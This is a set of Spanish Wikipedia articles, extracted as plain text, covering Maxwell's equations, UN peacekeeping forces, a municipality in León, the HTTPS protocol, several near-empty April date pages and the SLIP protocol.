<doc id="6226" url="https://es.wikipedia.org/wiki?curid=6226" title="Ecuaciones de Maxwell">
Ecuaciones de Maxwell

Las ecuaciones de Maxwell son un conjunto de cuatro ecuaciones (originalmente 20 ecuaciones) que describen por completo los fenómenos electromagnéticos. La gran contribución de James Clerk Maxwell fue reunir en estas ecuaciones largos años de resultados experimentales, debidos a Coulomb, Gauss, Ampere, Faraday y otros, introduciendo los conceptos de campo y corriente de desplazamiento, y unificando los campos eléctricos y magnéticos en un solo concepto: el campo electromagnético.

Desde finales del siglo XVIII diversos científicos formularon leyes cuantitativas que relacionaban las interacciones entre los campos eléctricos, los campos magnéticos y las corrientes sobre conductores. Entre estas leyes están la ley de Ampère, la ley de Faraday o la ley de Lenz. Maxwell lograría unificar todas estas leyes en una descripción coherente del campo electromagnético.

Maxwell se dio cuenta de que la conservación de la carga eléctrica parecía requerir introducir un término adicional en la ley de Ampère. De hecho, actualmente se considera que uno de los aspectos más importantes del trabajo de Maxwell en el electromagnetismo es el término que introdujo en dicha ley: la derivada temporal de un campo eléctrico, conocida como corriente de desplazamiento. El trabajo que Maxwell publicó en 1865, "", modificaba la versión de la ley de Ampère con lo que se predecía la existencia de ondas electromagnéticas propagándose, dependiendo del medio material, a la velocidad de la luz en dicho medio. De esta forma Maxwell identificó la luz como una onda electromagnética, unificando así la óptica con el electromagnetismo. 

Exceptuando la modificación a la ley de Ampère, ninguna de las otras ecuaciones era original. Lo que hizo Maxwell fue reobtener dichas ecuaciones a partir de modelos mecánicos e hidrodinámicos usando su modelo de vórtices de líneas de fuerza de Faraday.

En 1884, Oliver Heaviside junto con Willard Gibbs agrupó estas ecuaciones y las reformuló en la notación vectorial actual. Sin embargo, es importante conocer que al hacer eso, Heaviside usó derivadas parciales temporales, diferentes a las derivadas totales usadas por Maxwell, en la ecuación (54). Ello provocó que se perdiera el término formula_1 que aparecía en la ecuación posterior del trabajo de Maxwell (número 77). En la actualidad, este término se usa como complementario a estas ecuaciones y se conoce como fuerza de Lorentz.

La historia es aún confusa, debido a que el término ecuaciones de Maxwell se usa también para un conjunto de ocho ecuaciones en la publicación de Maxwell de 1865, "A Dynamical Theory of the Electromagnetic Field", y esta confusión se debe a que seis de las ocho ecuaciones son escritas como tres ecuaciones para cada eje de coordenadas, así se puede uno confundir al encontrar veinte ecuaciones con veinte incógnitas. Los dos "tipos" de ecuaciones son casi equivalentes, a pesar del término eliminado por Heaviside en las actuales cuatro ecuaciones.

La ley de Gauss explica la relación entre el flujo del campo eléctrico y una superficie cerrada. Se define como flujo eléctrico (formula_2) a la cantidad de "fluido eléctrico" que atraviesa una superficie dada. Análogo al flujo de la mecánica de fluidos, este fluido eléctrico no transporta materia, pero ayuda a analizar la cantidad de campo eléctrico (formula_3) que pasa por una superficie S. Matemáticamente se expresa como:

La ley dice que el flujo del campo eléctrico a través de una superficie cerrada es igual al cociente entre la carga (q) o la suma de las cargas que hay en el interior de la superficie y la permitividad eléctrica en el vacío (formula_5), así:

La forma diferencial de la ley de Gauss, en forma local, afirma que por el teorema de Gauss-Ostrogradsky, la divergencia del campo eléctrico es proporcional a la densidad de carga eléctrica, es decir,

donde formula_6 es la densidad de carga en el medio interior a la superficie cerrada. Intuitivamente significa que el campo E diverge o sale desde una carga formula_7, lo que se representa gráficamente como vectores que salen de la fuente que las genera en todas direcciones. Por convención si el valor de la expresión es positivo entonces los vectores salen, si es negativo estos entran a la carga. 

Para casos generales se debe introducir una cantidad llamada densidad de flujo eléctrico (formula_8) y nuestra expresión obtiene la forma:

Experimentalmente se llegó al resultado de que los campos magnéticos, a diferencia de los eléctricos, no comienzan y terminan en cargas diferentes. Esta ley primordialmente indica que las líneas de los campos magnéticos deben ser cerradas. En otras palabras, se dice que sobre una superficie cerrada, sea cual sea esta, no seremos capaces de encerrar una fuente o sumidero de campo, esto expresa la inexistencia del monopolo magnético. Al encerrar un dipolo en una superficie cerrada, no sale ni entra flujo magnético,
por lo tanto el campo magnético no diverge, no sale de la superficie. Entonces la divergencia es cero. Matemáticamente esto se expresa así:

donde formula_10 es la densidad de flujo magnético, también llamada inducción magnética. Es claro que la divergencia sea cero porque no salen ni entran vectores de campo sino que este hace caminos cerrados. El campo no diverge, es decir la divergencia de B es nula.

Su forma integral equivalente:

Como en la forma integral del campo eléctrico, esta ecuación solo funciona si la integral está definida en una superficie cerrada.

La ley de Faraday nos habla sobre la inducción electromagnética, la que origina una fuerza electromotriz en un campo magnético. Es habitual llamarla ley de Faraday-Lenz en honor a Heinrich Lenz ya que el signo menos proviene de la Ley de Lenz. También se le llama como ley de Faraday-Henry, debido a que Joseph Henry descubrió esta inducción de manera separada a Faraday pero casi simultáneamente. Lo primero que se debe introducir es la fuerza electromotriz (formula_11), si tenemos un campo magnético variable con el tiempo, una fuerza electromotriz es inducida en cualquier circuito eléctrico; y esta fuerza es igual a menos la derivada temporal del flujo magnético, así:
como el campo magnético es dependiente de la posición tenemos que el flujo magnético es igual a:
Además, el que exista fuerza electromotriz indica que existe un campo eléctrico que se representa como:
con lo que finalmente se obtiene la expresión de la ley de Faraday:

Lo que indica que un campo magnético que depende del tiempo implica la existencia de un campo eléctrico, del que su circulación por un camino arbitrario cerrado es igual a menos la derivada temporal del flujo magnético en cualquier superficie limitada por el camino cerrado.

El signo negativo explica que el sentido de la corriente inducida es tal que su flujo se opone a la causa que lo produce, compensando así la variación de flujo magnético (Ley de Lenz).

La forma diferencial local de esta ecuación es:
Es decir, el rotacional del campo eléctrico es la derivada de la inducción magnética con respecto al tiempo.

Se interpreta como sigue: si existe una variación de campo magnético B entonces este provoca un campo eléctrico E o bien la existencia de un campo magnético no estacionario en el espacio libre provoca circulaciones del vector E a lo largo de líneas cerradas. En presencia de cargas libres, como los electrones, el campo E puede desplazar las cargas y producir una corriente eléctrica. Esta ecuación relaciona los campos eléctrico y magnético, y tiene otras aplicaciones prácticas como los motores eléctricos y los generadores eléctricos y explica su funcionamiento. Más precisamente, demuestra que un voltaje puede ser generado variando el flujo magnético que atraviesa una superficie dada.

Ampère formuló una relación para un campo magnético inmóvil y una corriente eléctrica que no varía en el tiempo. La ley de Ampère nos dice que la circulación en un campo magnético (formula_10) a lo largo de una curva cerrada C es igual a la densidad de corriente (formula_17) sobre la superficie encerrada en la curva C, matemáticamente así:
donde formula_19 es la permeabilidad magnética en el vacío.

Pero cuando esta relación se la considera con campos que sí varían a través del tiempo llega a cálculos erróneos, como el de violar la conservación de la carga. Maxwell corrigió esta ecuación para lograr adaptarla a campos no estacionarios y posteriormente pudo ser comprobada experimentalmente por Heinrich Rudolf Hertz.

Maxwell reformuló esta ley así:

En el caso específico estacionario esta relación corresponde a la ley de Ampère, además confirma que un campo eléctrico que varía con el tiempo produce un campo magnético y además es consecuente con el principio de conservación de la carga.

En forma diferencial, esta ecuación toma la forma:

En forma sencilla esta ecuación explica que si se tiene un conductor, un alambre recto que tiene una densidad de corriente J, esta provoca la aparición de un campo magnético B rotacional alrededor del alambre y que el rotor de B apunta en el mismo sentido que J.

Para el caso de que las cargas estén en medios materiales, y asumiendo que estos son lineales, homogéneos, isótropos y no dispersivos, podemos encontrar una relación entre los vectores intensidad eléctrica e inducción magnética a través de dos parámetros conocidos como permitividad eléctrica y la permeabilidad magnética:

Pero estos valores también dependen del medio material, por lo que se dice que un medio es lineal cuando la relación entre E/D y B/H es lineal. Si esta relación es lineal, matemáticamente se puede decir que formula_24 y formula_25 están representadas por una matriz 3x3. Si un medio es isótropo es porque esta matriz ha podido ser diagonalizada y consecuentemente es equivalente a una función formula_26; si en esta diagonal uno de los elementos es diferente al otro se dice que es un medio anisótropo. Estos elementos también son llamados constantes dieléctricas y, cuando estas constantes no dependen de su posición, el medio es homogéneo.

Los valores de formula_24 y formula_25 en medios lineales no dependen de las intensidades del campo. Por otro lado, la permitividad y la permeabilidad son escalares cuando las cargas están en medios homogéneos e isótropos. Los medios heterogéneos e isótropos dependen de las coordenadas de cada punto por lo que los valores, escalares, van a depender de la posición. Los medios anisótropos son tensores. Finalmente, en el vacío tanto formula_29 como formula_17 son cero porque suponemos que no hay fuentes.

En la siguiente tabla encontramos las ecuaciones como se las fórmula en el caso general y en la materia.

Las ecuaciones de Maxwell como ahora las conocemos son las cuatro citadas anteriormente y a manera de resumen se pueden encontrar en la siguiente tabla:

Estas cuatro ecuaciones junto con la fuerza de Lorentz son las que explican cualquier tipo de fenómeno electromagnético. Una fortaleza de las ecuaciones de Maxwell es que permanecen invariantes en cualquier sistema de unidades, salvo de pequeñas excepciones, y que son compatibles con la relatividad especial y general. Además Maxwell descubrió que la cantidad formula_31 era simplemente la velocidad de la luz en el vacío, por lo que la luz es una forma de radiación electromagnética. Los valores aceptados actualmente para la velocidad de la luz, la permitividad y la permeabilidad magnética se resumen en la siguiente tabla:

Como consecuencia matemática de las ecuaciones de Maxwell y además con el objetivo de simplificar sus cálculos se han introducido los conceptos de potencial vector (formula_32) y potencial escalar (formula_33). Este potencial vector no es único y no tiene significado físico claro pero se sabe que un elemento infinitesimal de corriente da lugar a una contribución formula_34 paralela a la corriente. Este potencial se obtiene como consecuencia de la ley de Gauss para el flujo magnético, ya que se conoce que si la divergencia de un vector es cero, ese vector como consecuencia define a un rotacional, así:

A partir de este potencial vector y de la ley de Faraday puede definirse un potencial escalar así:

formula_37

donde el signo menos (formula_38) es por convención. Estos potenciales son importantes porque poseen una simetría gauge que nos da cierta libertad a la hora de escogerlos. El campo eléctrico en función de los potenciales:

Hallamos que con la introducción de estas cantidades las ecuaciones de Maxwell quedan reducidas solo a dos, puesto que, la ley de Gauss para el campo magnético y la ley de Faraday quedan satisfechas por definición. Así la ley de Gauss para el campo eléctrico escrita en términos de los potenciales:

formula_40

y la ley de ampère generalizada

formula_41

Nótese que se ha pasado de un conjunto de cuatro ecuaciones diferenciales parciales de primer orden a solo dos ecuaciones diferenciales parciales pero de segundo orden. Sin embargo, estas ecuaciones se pueden simplificar con ayuda de una adecuada elección del gauge.

Las ecuaciones de Maxwell llevan implícitas el principio de conservación de la carga. El principio afirma que la carga eléctrica no se crea ni se destruye, ni global ni localmente, sino que únicamente se transfiere; y que si en una superficie cerrada está disminuyendo la carga contenida en su interior, debe haber un flujo de corriente neto hacia el exterior del sistema. Es decir la densidad de carga formula_42 y la densidad de corriente formula_43 satisfacen una ecuación de continuidad.

A partir de la forma diferencial de la ley de Ampère se tiene:

formula_44

que al reemplazar la ley de Gauss y tomar en cuenta que formula_45 (para cualquier vector formula_46), se obtiene:

formula_47

o bien en forma integral: formula_48

En el capítulo III de "A Dynamical Theory of the Electromagnetic Field", titulado "Ecuaciones generales del campo electromagnético", Maxwell formuló ocho ecuaciones que nombró de la A a la H. Estas ecuaciones llegaron a ser conocidas como "las ecuaciones de Maxwell", pero ahora este epíteto lo reciben las ecuaciones que agrupó Heaviside. La versión de Heaviside de las ecuaciones de Maxwell realmente contiene solo una ecuación de las ocho originales, la ley de Gauss que en el conjunto de ocho sería la ecuación G. Además Heaviside fusionó la ecuación A de Maxwell de la corriente total con la ley circuital de Ampère que en el trabajo de Maxwell era la ecuación C. Esta fusión, que Maxwell por sí mismo publicó en su trabajo "On Physical Lines of Force" de 1861 modifica la ley circuital de Ampère para incluir la corriente de desplazamiento de Maxwell.

Las ocho ecuaciones originales de Maxwell pueden ser escritas en forma vectorial así: 

donde: formula_49 es el vector intensidad de campo magnético (llamado por Maxwell como "intensidad magnética"); formula_17 es la densidad de corriente eléctrica y formula_51 es la corriente total incluida la corriente de desplazamiento; formula_8 es el campo desplazamiento (desplazamiento eléctrico); formula_29 es la densidad de carga libre (cantidad libre de electricidad); formula_32 es el vector potencial magnético (impulso magnético); formula_3 es el campo eléctrico (fuerza electromotriz [no confundir con la actual definición de fuerza electromotriz]); formula_56 es el potencial eléctrico y formula_57 es la conductividad eléctrica (resistencia específica, ahora solo resistencia).

Maxwell no consideró a los medios materiales en general, esta formulación inicial usa la permitividad y la permeabilidad en medios lineales, isótropos y no dispersos, a pesar que también se las puede usar en medios anisótropos.

Maxwell incluyó el término formula_58 en la expresión de la fuerza electromotriz de la ecuación D, que corresponde a la fuerza magnética por unidad de carga en un conductor que se mueve a una velocidad formula_59. Esto significa que la ecuación D es otra formulación de la fuerza de Lorentz. Esta ecuación primero apareció como la ecuación 77 de la publicación "On Physical Lines of Force" de Maxwell, anterior a la publicación de Lorentz. En la actualidad esta fuerza de Lorentz no forma parte de las ecuaciones de Maxwell pero se la considera una ecuación adicional fundamental en el electromagnetismo.

En la relatividad especial, las ecuaciones de Maxwell en el vacío se escriben mediante unas relaciones geométricas, las cuales toman la misma forma en cualquier sistema de referencia inercial. Estas ecuaciones están escritas en términos de cuadrivectores y tensores contravariantes, que son objetos geométricos definidos en M. Estos objetos se relacionan mediante formas diferenciales en relaciones geométricas que al expresarlas en componentes de los sistemas coordenados Lorentz proporcionan las ecuaciones para el campo electromagnético.

La cuadricorriente formula_60 está descrita por una 1-forma y lleva la información sobre la distribución de cargas y corrientes. Sus componentes son:

Que debe cumplir la siguiente relación geométrica para que se cumpla la ecuación de continuidad.

Escrito en componentes de los sistemas coordenados Lorentz queda:

Para poner en correspondencia objetos del mismo rango, se utiliza el operador de Laplace-Beltrami o laplaciana definida como:

Podemos poner en correspondencia el cuadrivector densidad de corriente con otro objeto del mismo rango como es el cuadripotencial, que lleva la información del potencial eléctrico y el potencial vector magnético.

O escrito en coordenadas Lorentz obtenemos que:

Expresión que reproduce las ecuaciones de onda para los potenciales electromagnéticos.

La 1-forma A lleva la información sobre los potenciales de los observadores inerciales siendo sus componentes:
Para obtener el objeto geométrico que contiene los campos, tenemos que subir el rango de A mediante el operador diferencial exterior formula_63 obteniendo la 2-forma F campo electromagnético. En forma geométrica podemos escribir:
Que expresado para un sistema inercial Lorentz tenemos que:
Con lo que obtenemos el tensor de campo electromagnético.

Las siguientes expresiones ligan los campos con las fuentes, relacionamos la cuadricorriente con el tensor campo electromagnético mediante la forma geométrica:
O bien en coordenadas Lorentz:

Para un observable en S partiendo de expresión en coordenadas Lorentz podemos obtener:
Por tanto:

Corresponden a las ecuaciones homogéneas. Escritas en forma geométrica tenemos que:
Que corresponde con la expresión en los sistemas coordenados Lorentz:
Donde el tensor formula_77 es el tensor dual de F. Se obtiene mediante el operador de Hodge.

Por tanto: 

La propiedad formula_83 reproduce las ecuaciones de Maxwell internas, que se puede expresar como formula_84, que se puede escribir en los sistemas coordenados Lorentz como:

Podemos resumir el conjunto de expresiones que relacionan los objetos que describen el campo electromagnético en la siguiente tabla. La primera columna son las relaciones geométricas, independientes de cualquier observador; la segunda columna son las ecuaciones descritas mediante un sistema coordenado Lorentz; y la tercera es la descripción de la relación y la ley que cumple.

(*) "Existe una confusión habitual en cuanto a la nomenclatura de este gauge. Las primeras ecuaciones en las que aparece tal condición (1867) se deben a Ludvig V. Lorenz, no al mucho más conocido Hendrik A. Lorentz. (Véase: J.D. Jackson: Classical Electrodynamics, 3rd edition p.294)"

Finalmente el cuadrigradiente se define así:

Los índices repetidos se suman de acuerdo al convenio de sumación de Einstein. De acuerdo con el cálculo tensorial, los índices pueden subirse o bajarse por medio de la matriz fundamental "g". 

El primer tensor es una expresión de dos ecuaciones de Maxwell, la ley de Gauss y la ley de Ampère generalizada; la segunda ecuación es consecuentemente una expresión de las otras dos leyes.

Se ha sugerido que el componente de la fuerza de Lorentz formula_87 se puede derivar de la ley de Coulomb y por eso la relatividad especial asume la invarianza de la carga eléctrica.

En las ecuaciones de Maxwell, los campos vectoriales no son solo funciones de la posición, en general son funciones de la posición y del tiempo, como por ejemplo formula_88. Para la resolución de estas ecuaciones en derivadas parciales, las variables posicionales se encuentran con la variable temporal. En la práctica, la resolución de dichas ecuaciones pueden contener una solución armónica (sinusoidal). 

Con ayuda de la notación compleja se puede evitar la dependencia temporal de los resultados armónicos, eliminando así el factor complejo de la expresión formula_89. Gran parte de las resoluciones de las ecuaciones de Maxwell toman amplitudes complejas, además de no ser solo función de la posición. En lugar de la derivación parcial en el tiempo se tiene la multiplicación del factor imaginario formula_90, donde formula_91 es la frecuencia angular.

En la forma compleja, las ecuaciones de Maxwell toman la siguiente forma:




</doc>
<doc id="6229" url="https://es.wikipedia.org/wiki?curid=6229" title="Fuerzas de paz de las Naciones Unidas">
Fuerzas de paz de las Naciones Unidas

Las Fuerzas de Paz de la ONU, popularmente conocidas como los cascos azules debido al color de los mismos, son cuerpos militares encargados de crear y mantener la paz en áreas de conflictos, monitorear y observar los procesos pacíficos y de brindar asistencia a ex combatientes en la implementación de tratados con fines pacíficos. Actúan por mandato directo del Consejo de Seguridad de la ONU y forman parte miembros de las integrantes de las Naciones Unidas integrando una fuerza multinacional.

La primera operación de mantenimiento de la paz fue la UNSCOB (United Nations Commission for the Balkans), dispuesta por la Asamblea General de las Naciones Unidas en la resolución n.° 109(II) del 21 de octubre de 1947. Se llevó a cabo en Grecia entre octubre de 1947 y febrero de 1952. La fuerza multinacional estableció su cuartel general en Salónica (Grecia) y fue integrada con miembros de Australia, Brasil, China, los Estados Unidos, Francia, el Reino Unido, México, los Países Bajos, Colombia y Pakistán.

En 1948, el Consejo de Seguridad de las Naciones Unidas abogó por la creación de una fuerza multinacional que pusiese fin y supervisara el cese de las hostilidades entre Egipto e Israel. Esta misión no fue militar, sino que estaban presentes como observadores.

Una misión, que no corresponde con sus presuntos objetivos, fue su participación en el conflicto entre Corea del Norte y Corea del Sur en 1950, en el cual intervinieron por mandato del Consejo de Seguridad —el cual sesionó en ausencia de la Unión Soviética— tomando parte en forma directa en este conflicto armado.

En 1956 se dispuso una operación de paz durante la crisis del Canal de Suez por una resolución presentada a la Asamblea General de la ONU por el ministro de asuntos extranjeros canadiense Lester Bowles Pearson. Posteriormente han actuado en otros conflictos en Oriente Medio, Líbano, Chipre, Mozambique, Somalia, Bosnia, etcétera.

El origen de los “llamativos” colores, tanto de sus cascos como de sus vehículos (blanco), se aprobó puesto que se quería dejar claro que se trataba de un cuerpo de paz fácilmente identificable, que no necesitaba camuflarse o pasar inadvertido para cumplir sus objetivos.

Los Cascos Azules o Fuerza de mantenimiento de la Paz de las Naciones Unidas tienen la misión de:
A pesar de que los objetivos de los Cascos Azules son la solución de conflictos y el mantenimiento de la paz, en varias ocasiones han sido objeto de críticas por parte de actuaciones contrarias a los derechos humanos. Uno de estos casos tuvo lugar en Ruanda en 1994, cuando los Cascos Azules fueron acusados de abandonar a los tutsis a manos del exterminio hutu. 
Otro ejemplo más reciente fue lo ocurrido en Haití en 2007, cuando un centenar de los integrantes de las tropas fueron acusados de abuso y explotación sexual contra la población. Estas tropas fueron sustituidas por Cascos Azules formados exclusivamente por mujeres, 600 en total.

En junio de 2015, la revista estadounidense "Foreign Policy" reveló una investigación interna de Naciones Unidas sobre un posible ocultamiento de denuncias por abusos sexuales a menores de edad perpetrados por Cascos Azules de la ONU y fuerzas de paz de Guinea, Chad y Guinea Ecuatorial en misiones en África. En total hay 13 abusos sexuales a niños documentados por parte de 16 soldados en un campo de refugiados en República Centroafricana, denunciado por Anders Kompass, quien presentó la denuncia ante autoridades de Francia. Los testimonios de las víctimas habían sido filtrados en el diario británico "The Guardian".

Un tribunal integrado por tres jueces independientes convocados por Ban Ki-moon, llegó en diciembre de 2015 a la conclusión que los funcionarios de la ONU, encabezados por Susana Malcorra, de Jefa de Gabinete de la ONU, habían intentado silenciar y ocultar los abusos,

En 1988, cuando Javier Pérez de Cuéllar era Secretario General de la ONU, los Cascos Azules se hicieron acreedores al Premio Nobel de la Paz gracias a su labor pacífica "por la participación en numerosos conflictos desde 1956".

En 1993, los Cascos Azules de la ONU destacados en la antigua Yugoslavia recibieron el Premio Príncipe de Asturias de Cooperación Internacional.




</doc>
<doc id="6231" url="https://es.wikipedia.org/wiki?curid=6231" title="Cebrones del Río">
Cebrones del Río

Cebrones del Río ("Zebrones del Riu" en leonés), es un municipio y localidad de España, en la provincia de León, comarca de la Tierra de La Bañeza, comunidad autónoma de Castilla y León. 

Situado a la izquierda del río Órbigo.

Los terrenos de Cebrones del Río limitan con los de Azares del Páramo al norte, Moscas del Páramo al este, Valcabado del Páramo al sur, San Juan de Torres al suroeste, Santa Elena de Jamuz al oeste y San Martín de Torres al noroeste. Su nombre se debe a la abundancia de cebros en estas tierras durante la Edad Media

Por este pueblo pasaron los romanos y prueba de ello es el puente sobre el río Órbigo, la torre del campanario de la iglesia y en el pueblo de San Martín de Torres, un castro prerromano; se dice que este pueblo fue villa romana, donde se encontraba la ciudad de Bedunia o Baedunia.

Los romanos con el fin de atajar pasaron por tierras de este municipio en su ida hacia Asturica Augusta (Astorga) venían desde tierras situadas en el municipio de Alija del Infantado.

Esta población consta en la actualidad de playa fluvial , zonas de acampada, merendero, zona deportiva y recreativa etc.

También cuenta con unas pinturas del siglo XVII por lo menos, recientemente restauradas que fueron descubiertas tras desmontar el altar mayor de la iglesia.

Tenia unas fiestas de interés deportivo por su concentración motera, "los terneros".

En la plaza del ayuntamiento se encuentra un monumento dedicado al poeta José Mayo Fernández, nacido en la misma localidad y que estuvo viviendo hasta los 20 años.


</doc>
<doc id="6240" url="https://es.wikipedia.org/wiki?curid=6240" title="Protocolo seguro de transferencia de hipertexto">
Protocolo seguro de transferencia de hipertexto

El Protocolo seguro de transferencia de hipertexto (en inglés: Hypertext Transport Protocol Secure o HTTPS), es un protocolo de aplicación basado en el protocolo HTTP, destinado a la transferencia segura de datos de Hipertexto, es decir, es la versión segura de HTTP.

El sistema HTTPS utiliza un cifrado basado en SSL/TLS para crear un canal cifrado (cuyo nivel de cifrado depende del servidor remoto y del navegador utilizado por el cliente) más apropiado para el tráfico de información sensible que el protocolo HTTP. De este modo se consigue que la información sensible (usuario y claves de paso normalmente) no pueda ser usada por un atacante que haya conseguido interceptar la transferencia de datos de la conexión, ya que lo único que obtendrá será un flujo de datos cifrados que le resultará imposible de descifrar.

El puerto estándar para este protocolo es el 443.

Netscape Communications creó HTTPS en 1992 para su navegador Netscape Navigator. Originalmente, HTTPS era usado solamente para guardar cosas en la casa cifrado SSL, pero esto se volvió obsoleto ante TLS. HTTPS fue adoptado como un estándar web con la publicación de RFC 2818 en mayo del 2000.

En el protocolo HTTP las URLs comienzan con "http://" y utilizan por omisión el , las URLs de HTTPS comienzan con "https://" y utilizan el por omisión.

HTTP es inseguro y está sujeto a ataques "man-in-the-middle" y "eavesdropping" que pueden permitir al atacante obtener acceso a cuentas de un sitio web e información confidencial. HTTPS está diseñado para resistir esos ataques y ser más seguro.

HTTP opera en la capa más alta del modelo OSI, la capa de aplicación; pero el protocolo de seguridad opera en una subcapa más baja, cifrando un mensaje HTTP previo a la transmisión y descifrando un mensaje una vez recibido. Estrictamente hablando, HTTPS no es un protocolo separado, pero refiere el uso del HTTP ordinario sobre una Capa de Conexión Segura cifrada Secure Sockets Layer (SSL) o una conexión con Seguridad de la Capa de Transporte (TLS).

Para preparar un servidor web que acepte conexiones HTTPS, el administrador debe crear un certificado de clave pública para el servidor web. Este certificado debe estar firmado por una autoridad de certificación para que el navegador web lo acepte. La autoridad certifica que el titular del certificado es quien dice ser. Los navegadores web generalmente son distribuidos con los certificados raíz firmados por la mayoría de las autoridades de certificación por lo que estos pueden verificar certificados firmados por ellos.

Adquirir certificados puede ser gratuito o costar entre US$13 y US$1500 por año.

Las organizaciones pueden también ser su propia autoridad de certificación, particularmente si son responsables de establecer acceso a navegadores de sus propios sitios (por ejemplo, sitios en la intranet de una empresa, o grandes universidades). Estas pueden fácilmente agregar copias de su propio certificado firmado a los certificados de confianza distribuidos con el navegador.

También existen autoridades de certificación "peer-to-peer".

El sistema puede también ser usado para la autenticación de clientes con el objetivo de limitar el acceso a un servidor web a usuarios autorizados. Para hacer esto el administrador del sitio típicamente crea un certificado para cada usuario, un certificado que es guardado dentro de su navegador. Normalmente, este contiene el nombre y la dirección de correo del usuario autorizado y es revisado automáticamente en cada reconexión para verificar la identidad del usuario, potencialmente sin que cada vez tenga que ingresar una contraseña.

Un certificado puede ser revocado si este ya ha expirado, por ejemplo cuando el secreto de la llave privada ha sido comprometido. Los navegadores más nuevos como son Firefox, Opera, e Internet Explorer sobre Windows Vista implementan el Protocolo de Estado de Certificado Online (OCSP) para verificar que ese no es el caso. El navegador envía el número de serie del certificado a la autoridad de certificación o, es delegado vía OCSP y la autoridad responde, diciéndole al navegador si debe o no considerar el certificado como válido.
En febrero de 2017, la adopción HTTPS fue:

Argentina: 9,77% del total de dominios.

España: 5,11% del total de dominios.

México: 13.31% del total de dominios.

Chile: 18,71% del total de dominios.

Colombia: 4,85% del total de dominios.

Desde Google están intentando incentivar el uso de https para mejorar la seguridad de transferencia de información en internet. Actualmente, desde su navegador Chrome marcan como "no seguras" las urls bajo http y según las comunicaciones de la compañía en un futuro marcarán como "no seguras" todas las webs que no estén bajo https. Esto está aumentando la tasa de implementación de certificados SSL y cada vez más webs están bajo https.

El nivel de protección depende de la exactitud de la implementación del navegador web, el software del servidor y los algoritmos de cifrado actualmente soportados. Vea la lista en Idea Principal.

También, HTTPS es vulnerable cuando se aplica a contenido estático de publicación disponible. El sitio entero puede ser indexado usando una araña web, y la URI del recurso cifrado puede ser adivinada conociendo solamente el tamaño de la petición/respuesta. Esto permite a un atacante tener acceso al texto plano (contenido estático de publicación), y al texto cifrado (La versión cifrada del contenido estático), permitiendo un ataque criptográfico.

Debido a que SSL opera bajo HTTP y no tiene conocimiento de protocolos de nivel más alto, los servidores SSL solo pueden presentar estrictamente un certificado para una combinación de puerto/IP en particular Esto quiere decir, que en la mayoría de los casos, no es recomendable usar Hosting virtual name-based con HTTPS. Existe una solución llamada Server Name Indication (SNI) que envía el hostname al servidor antes de que la conexión sea cifrada, sin embargo muchos navegadores antiguos no soportan esta extensión. El soporte para SNI está disponible desde Firefox 2, Opera 8, e Internet Explorer 7 sobre Windows Vista.




</doc>
<doc id="6242" url="https://es.wikipedia.org/wiki?curid=6242" title="1 de abril">
1 de abril

El 1 de abril es el 91.º (nonagésimo primer) día del año en el calendario gregoriano y el 92.º en los años bisiestos. Quedan 274 días para finalizar el año.








</doc>
<doc id="6246" url="https://es.wikipedia.org/wiki?curid=6246" title="2 de abril">
2 de abril

El 2 de abril es el 92.º (nonagésimo segundo) día del año en el calendario gregoriano y el 93.º en los años bisiestos. Quedan 273 días para finalizar el año.








</doc>
<doc id="6247" url="https://es.wikipedia.org/wiki?curid=6247" title="3 de abril">
3 de abril

El 3 de abril es el 93.º (nonagésimo tercer) día del año del calendario gregoriano y el 94.º en los años bisiestos. Quedan 272 días para finalizar el año.

















</doc>
<doc id="6248" url="https://es.wikipedia.org/wiki?curid=6248" title="4 de abril">
4 de abril

El 4 de abril es el 94.º (nonagésimo cuarto) día del año del calendario gregoriano y el 95.º en los años bisiestos. Quedan 271 días para finalizar el año.



















</doc>
<doc id="6249" url="https://es.wikipedia.org/wiki?curid=6249" title="5 de abril">
5 de abril

El 5 de abril es el 95.º (nonagésimo quinto) día del año en el calendario gregoriano y el 96.º en los años bisiestos. Quedan 270 días para finalizar el año.







</doc>
<doc id="6250" url="https://es.wikipedia.org/wiki?curid=6250" title="6 de abril">
6 de abril

El 6 de abril es el 96.º (nonagésimo sexto) día del año en el calendario gregoriano y el 97.º en los años bisiestos. Quedan, a partir de la fecha, 269 días para finalizar el año.








</doc>
<doc id="6251" url="https://es.wikipedia.org/wiki?curid=6251" title="Serial Line Internet Protocol">
Serial Line Internet Protocol

El protocolo SLIP ("Serial Line Internet Protocol") es un estándar de transmisión de datagramas IP para líneas serie, pero que ha quedado bastante obsoleto.
Fue diseñado para trabajar a través de puerto serie y conexión de módem. Su especificación se encuentra en el documento RFC 1055.

En PC, SLIP se ha sustituido por el PPP (Point-to-Point Protocol) cuyo diseño es superior, tiene más y mejores características y no requiere de la configuración de su dirección IP antes de ser establecido. 
Sin embargo, con microcontroladores, se sigue utilizando el modo de encapsulación de SLIP para paquetes IP ya que usa cabeceras de tamaño reducido.

Este protocolo funciona en una gran variedad de redes como Ethernet (802.3), token ring (802.5), redes de área local (Lan), líneas X-25, para conexiones punto a punto bajo conexiones TCP/IP, o de acceso remoto que solían utilizar servidores UNIX.

SLIP requiere una configuración de puerto de 8 bits de datos, no paridad y acepta cualquiera de los controles de flujo por hardware de EIA (Electronic Industries Alliance). Una versión de SLIP con compresión de cabeceras es CSLIP (Compressed SLIP). Fue desarrollada por "Van Jacobson" y su funcionalidad consiste en reducir el header típico de 40 bytes a 3 ó 5 bytes, ayudándose del hecho de que muchos de los campos del comunicaciones mediante Bluetooth entre ordenadores.

SLIP tiene sus orígenes en la implementación 3 COM UNET TCP/IP y fue diseñado en 1984 por Rick Adams. SLIP es simplemente una definición de una serie de caracteres, para llevar paquetes IP en una línea serie. Al ser un protocolo de muy fácil implementación no proporciona ni direccionamiento, ni identificación de tipo de paquete, ni detección/corrección de errores ni mecanismos de compresión. Ya en 1984 era posible la conexión de forma sencilla de host y encaminadores (routers) mediante líneas serie. SLIP se puede emplear en líneas con velocidades entre 1200 bps y 19.2 Kbps. Las configuraciones de SLIP más comunes van a ser: host-host, host-router y router-router.

SLIP modifica cada datagrama IP añadiéndole un carácter especial C0 o “SLIP END” que permite distinguir entre diferentes datagramas. Para prevenir ruido de línea se acostumbra mandar uno al principio también; de modo que se dé por terminada cualquier tipo de conexión errónea anterior.

Si el carácter C0 se presenta en el contenido del datagrama, se utiliza la secuencia de dos bytes DB, DC. El carácter DB es el carácter de escape de SLIP (distinto al valor ASCII de ESC –1B--).

Si en el contenido se presenta el carácter de escape; se reemplaza por la secuencia DB, DD.

